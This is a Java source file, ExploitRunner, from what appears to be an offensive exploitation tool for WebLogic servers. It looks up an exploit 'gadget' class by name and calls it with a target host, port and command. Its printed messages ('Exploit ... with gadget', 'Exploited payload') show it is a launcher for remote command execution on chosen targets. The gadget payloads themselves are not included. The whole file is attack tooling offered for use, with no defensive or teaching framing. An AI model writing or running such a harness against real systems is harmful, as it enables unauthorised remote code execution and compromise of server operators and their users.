package org.weblogic.exploit.util;

import org.weblogic.exploit.Exploit;

public class ExploitRunner {

    public static void run(String host, String port, String className, String command) throws Exception {
        Class<? extends Exploit> clazz = getExploitClass(className);
        run(host, port, clazz, command);
    }

    public static void run(String host, String port, Class<? extends Exploit> clazz, String command) throws Exception {
        System.out.println("Exploit " + host + ":" + port + " with gadget: " + clazz.getSimpleName() + " for command: '" + command + "'");
        Exploit payload = clazz.newInstance();
        payload.exploit(host, port, command);
        System.out.println("Exploited payload");
    }

    @SuppressWarnings("unchecked")
    public static Class<? extends Exploit> getExploitClass(String className) throws Exception {
        Class<? extends Exploit> clazz = null;
        try {
            clazz = (Class<? extends Exploit>) Class.forName(className);
        } catch (ClassNotFoundException ex) {
            clazz = (Class<? extends Exploit>) Class.forName(Exploit.class.getPackage().getName() + "." +  className);
        }

        if (!Exploit.class.isAssignableFrom(clazz)) {
            throw new Exception("Gadget invalid");
        }
        return clazz;
    }
}
